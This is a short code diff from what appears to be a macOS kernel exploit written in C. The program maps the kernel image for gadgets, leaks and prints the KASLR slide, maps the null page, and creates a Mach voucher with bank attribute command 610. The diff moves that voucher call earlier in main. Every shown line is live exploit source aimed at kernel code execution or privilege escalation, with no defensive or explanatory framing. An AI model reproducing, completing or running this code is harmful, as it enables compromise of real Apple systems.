@@ -67,6 +67,15 @@ int main(int argc, char **argv)
     return 2;
   }
 
+  mach_voucher_t kv;
+  mach_voucher_attr_recipe_data_t task_create_recipe = {
+    .key = MACH_VOUCHER_ATTR_KEY_BANK,
+    .command = 610,
+    .content_size = 0
+  };
+
+  _voucher_create_mach_voucher(&task_create_recipe, sizeof(mach_voucher_attr_recipe_data_t), &kv);
+
   uint64_t status=0;
   if (strcmp(argv[1], "enable") == 0) {
     status=0;
@@ -77,7 +86,6 @@ int main(int argc, char **argv)
     return 3;
   }
 
-  kern_return_t kr;
   gadget_map_t *map=rnr_map_file_with_path(KERNEL_PATH);
   if (!map->map) {
     fprintf(stderr, "[!] unable to map kernel!\n");
@@ -86,14 +94,6 @@ int main(int argc, char **argv)
 
   RNR_SET_SLIDE(rnr_get_kslide());
   printf("[+] kaslr slide is: %#016llx\n", kslide);
-
-  mach_voucher_t kv;
-  mach_voucher_attr_recipe_data_t task_create_recipe;
-  task_create_recipe.key = MACH_VOUCHER_ATTR_KEY_BANK;
-  task_create_recipe.command = 610;
-  task_create_recipe.content_size = 0;
-
-  kr = _voucher_create_mach_voucher(&task_create_recipe, sizeof(mach_voucher_attr_recipe_data_t), &kv);
 
   alloc_null(0x1000);
 
